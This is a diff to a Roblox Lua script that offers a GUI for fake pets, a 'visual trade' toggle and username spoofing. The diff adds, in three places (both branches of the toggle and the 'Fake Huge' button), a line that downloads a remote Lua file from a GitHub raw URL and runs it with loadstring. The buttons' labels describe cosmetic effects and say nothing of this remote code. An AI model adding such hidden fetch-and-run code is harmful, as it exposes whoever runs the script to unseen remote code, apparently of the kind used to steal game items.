@@ -38,8 +38,10 @@ local PremiumSection = Premium:NewSection("💎 - Premium");
 FunctionSection:NewToggle("✅ On / ❌ Off ", "Turn On or Off the visual trade.", function(state)
 	if state then
 		Click:Play();
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
 	else
 		Click:Play();
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
 	end
 end);
 FunctionSection:NewButton("Fake Titanic 🧩 ", "Change a huge pet to a fake titanic", function()
@@ -52,6 +54,7 @@ FunctionSection:NewButton("Fake Banana 🍌 ", "Change a pet to a fake banana", 
 end);
 FunctionSection:NewButton("Fake Huge 🎈 ", "Change a pet to a fake huge", function()
 	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
 end);
 SpooferSection:NewButton("Spoof your username 😎 ", "Change your username", function()
 	Click:Play();
